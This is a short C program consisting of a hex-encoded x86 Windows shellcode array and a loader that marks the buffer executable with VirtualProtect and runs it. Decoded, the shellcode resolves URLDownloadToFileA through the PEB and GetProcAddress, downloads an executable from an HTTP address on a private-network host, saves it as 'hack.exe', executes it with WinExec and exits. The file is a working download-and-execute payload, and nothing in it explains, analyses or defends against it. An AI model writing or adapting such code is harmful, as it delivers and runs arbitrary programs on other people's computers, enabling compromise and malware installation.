#include<stdio.h>
#include<string.h>
#include<Windows.h>
char code[] = "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\x31\xc0\x66\xb8\x73\x73\x50\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65\x74\x50\x89\x65\x18\xe8\xb0\xff\xff\xff\x89\x45\xe4\x31\xd2\x52\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\xff\x75\xfc\x8b\x45\xe4\xff\xd0\x89\x45\xe0\x31\xc0\x66\xb8\x6f\x6e\x50\x68\x75\x72\x6c\x6d\x54\x8b\x5d\xe0\xff\xd3\x89\x45\xdc\x31\xd2\x66\xba\x65\x41\x52\x68\x6f\x46\x69\x6c\x68\x6f\x61\x64\x54\x68\x6f\x77\x6e\x6c\x68\x55\x52\x4c\x44\x54\xff\x75\xdc\x8b\x45\xe4\xff\xd0\x89\x45\xd8\x58\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x73\x65\x64\x74\x68\x2f\x67\x6f\x6f\x68\x36\x2e\x31\x33\x68\x36\x38\x2e\x35\x68\x39\x32\x2e\x31\x68\x3a\x2f\x2f\x31\x68\x68\x74\x74\x70\x54\x59\x31\xdb\x53\x68\x2e\x65\x78\x65\x68\x68\x61\x63\x6b\x54\x5b\x31\xd2\x52\x52\x53\x51\x52\x8b\x45\xd8\xff\xd0\x59\x83\xc4\x2c\x31\xd2\x39\xd0\x51\x75\xac\x5a\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xe8\xfe\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x68\x61\x63\x6b\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\xb7\xfe\xff\xff\x31\xd2\x52\xff\xd0";
int main(int argc, char** argv)
{
    int (*func)();
    DWORD dwOldProtect;
    func = (int(*)()) code;
    VirtualProtect(func, sizeof(code), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    (int)(*func)();
}
